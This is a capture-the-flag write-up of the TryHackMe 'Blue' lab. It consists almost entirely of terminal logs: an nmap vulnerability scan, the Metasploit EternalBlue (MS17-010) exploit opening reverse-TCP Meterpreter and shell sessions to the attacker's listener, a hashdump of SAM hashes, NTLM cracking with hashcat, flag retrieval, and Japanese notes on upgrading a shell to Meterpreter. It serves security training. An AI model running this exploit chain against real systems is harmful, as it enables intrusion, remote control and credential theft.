# Blue
Deploy & hack into a Windows machine, leveraging common misconfigurations issues.

```
┌──(yuu㉿kali)-[~/TryHackMe/Day3]
└─$ cat nmap.txt
# Nmap 7.94SVN scan initiated Mon Nov  4 10:31:02 2024 as: /usr/lib/nmap/nmap --privileged -sV -Pn -oN nmap.txt -v --script vuln 10.10.111.60
Pre-scan script results:
| broadcast-avahi-dos:
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.111.60
Host is up (0.42s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
| rdp-vuln-ms12-020:
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov  4 10:34:05 2024 -- 1 IP address (1 host up) scanned in 183.05 seconds
```

```
┌──(yuu㉿kali)-[~/TryHackMe/Day3]
└─$ msfconsole
Metasploit tip: Use the 'capture' plugin to start multiple
authentication-capturing and poisoning services


 ______________________________________________________________________________
|                                                                              |
|                          3Kom SuperHack II Logon                             |
|______________________________________________________________________________|
|                                                                              |
|                                                                              |
|                                                                              |
|                 User Name:          [   security    ]                        |
|                                                                              |
|                 Password:           [               ]                        |
|                                                                              |
|                                                                              |
|                                                                              |
|                                   [ OK ]                                     |
|______________________________________________________________________________|
|                                                                              |
|                                                       https://metasploit.com |
|______________________________________________________________________________|


       =[ metasploit v6.4.32-dev                          ]
+ -- --=[ 2459 exploits - 1266 auxiliary - 430 post       ]
+ -- --=[ 1468 payloads - 49 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search CVE-2017-0143

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7,
                                              Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Win
                                             dows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embed
                                             ded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.3.27     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.
```

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.111.60
RHOSTS => 10.10.111.60
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.X.XXX.XX
LHOST => 10.X.XXX.XX
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.X.XXX.XX:4444
[*] 10.10.111.60:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.111.60:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.111.60:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.111.60:445 - The target is vulnerable.
[*] 10.10.111.60:445 - Connecting to target for exploitation.
[+] 10.10.111.60:445 - Connection established for exploitation.
[+] 10.10.111.60:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.111.60:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.111.60:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.111.60:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.111.60:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.10.111.60:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.111.60:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.111.60:445 - Sending all but last fragment of exploit packet
[*] 10.10.111.60:445 - Starting non-paged pool grooming
[+] 10.10.111.60:445 - Sending SMBv2 buffers
[+] 10.10.111.60:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.111.60:445 - Sending final SMBv2 buffers.
[*] 10.10.111.60:445 - Sending last fragment of exploit packet!
[*] 10.10.111.60:445 - Receiving response from exploit packet
[+] 10.10.111.60:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.111.60:445 - Sending egg to corrupted connection.
[*] 10.10.111.60:445 - Triggering free of corrupted buffer.
[*] Sending stage (201798 bytes) to 10.10.111.60
[*] Meterpreter session 1 opened (10.X.XXX.XX:4444 -> 10.10.111.60:49310) at 2024-11-04 12:31:32 +0900
[+] 10.10.111.60:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.111.60:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.111.60:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

```
┌──(yuu㉿kali)-[~/TryHackMe/Day3]
└─$ nano hash_list.txt

┌──(yuu㉿kali)-[~/TryHackMe/Day3]
└─$ cat hash_list.txt
ffb43f0de35be4d9917ac0cc8ad57f8d

┌──(yuu㉿kali)-[~/TryHackMe/Day3]
└─$ hashcat -m 1000 hash_list.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: cpu--0x000, 1435/2935 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: ffb43f0de35be4d9917ac0cc8ad57f8d
Time.Started.....: Mon Nov  4 19:23:28 2024 (5 secs)
Time.Estimated...: Mon Nov  4 19:23:33 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2431.5 kH/s (0.07ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10201088/14344385 (71.12%)
Rejected.........: 0/10201088 (0.00%)
Restore.Point....: 10200064/14344385 (71.11%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: alread852 -> alphasarto11

Started: Mon Nov  4 19:23:06 2024
Stopped: Mon Nov  4 19:23:33 2024
```

```
meterpreter > search -f flag*.txt
Found 3 results...
==================

Path                                  Size (bytes)  Modified (UTC)
----                                  ------------  --------------
c:\Users\Jon\Documents\flag3.txt      37            2019-03-18 04:26:36 +0900
c:\Windows\System32\config\flag2.txt  34            2019-03-18 04:32:48 +0900
c:\flag1.txt                          24            2019-03-18 04:27:21 +0900

meterpreter > cat c:\\Users\\Jon\\Documents\\flag3.txt
flag{admin_documents_can_be_valuable}

meterpreter > cat c:\\Windows\\System32\\config\\flag2.txt
flag{sam_database_elevated_access}

meterpreter > cat c:\\flag1.txt
flag{access_the_machine}
```

```
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.152.49     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7,
                                              Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Win
                                             dows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embed
                                             ded Standard 7 target machines.


Payload options (windows/x64/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.4.109.58      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.4.109.58:4444
[*] 10.10.152.49:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.152.49:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.152.49:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.152.49:445 - The target is vulnerable.
[*] 10.10.152.49:445 - Connecting to target for exploitation.
[+] 10.10.152.49:445 - Connection established for exploitation.
[+] 10.10.152.49:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.152.49:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.152.49:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.152.49:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.152.49:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.10.152.49:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.152.49:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.152.49:445 - Sending all but last fragment of exploit packet
[*] 10.10.152.49:445 - Starting non-paged pool grooming
[+] 10.10.152.49:445 - Sending SMBv2 buffers
[+] 10.10.152.49:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.152.49:445 - Sending final SMBv2 buffers.
[*] 10.10.152.49:445 - Sending last fragment of exploit packet!
[*] 10.10.152.49:445 - Receiving response from exploit packet
[+] 10.10.152.49:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.152.49:445 - Sending egg to corrupted connection.
[*] 10.10.152.49:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.152.49
[+] 10.10.152.49:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.152.49:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.152.49:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Command shell session 3 opened (10.4.109.58:4444 -> 10.10.152.49:49286) at 2024-11-04 19:40:44 +0900


C:\Users\Jon\Desktop>
```

```
Meterpreterセッションは通常のシェルよりも多くの機能（ファイル操作、システム情報取得、権限操作など）を提供する上位のセッションと考えることができます。
Meterpreterセッションにアップグレードする手順は以下の通りです：

1. まず`post/multi/manage/shell_to_meterpreter`モジュールを使用します：
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter
```

2. オプションを確認します：
```
msf6 post(multi/manage/shell_to_meterpreter) > show options
```

3. 現在のシェルセッションの番号を確認します（セッション一覧を表示）：
```
msf6 post(multi/manage/shell_to_meterpreter) > sessions -l
```

4. SESSIONオプションに、アップグレードしたいシェルセッションの番号を設定します：
```
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 3
```
（3は現在のセッション番号に置き換えてください）

5. モジュールを実行します：
```
msf6 post(multi/manage/shell_to_meterpreter) > run
```

この作業が成功すると、新しいMeterpreterセッションが作成され、以前よりも多くのコマンドや機能が使用できるようになります。

新しいセッションに接続するには：
```
msf6 post(multi/manage/shell_to_meterpreter) > sessions -i [新しいセッション番号]
```
を使用します。
```
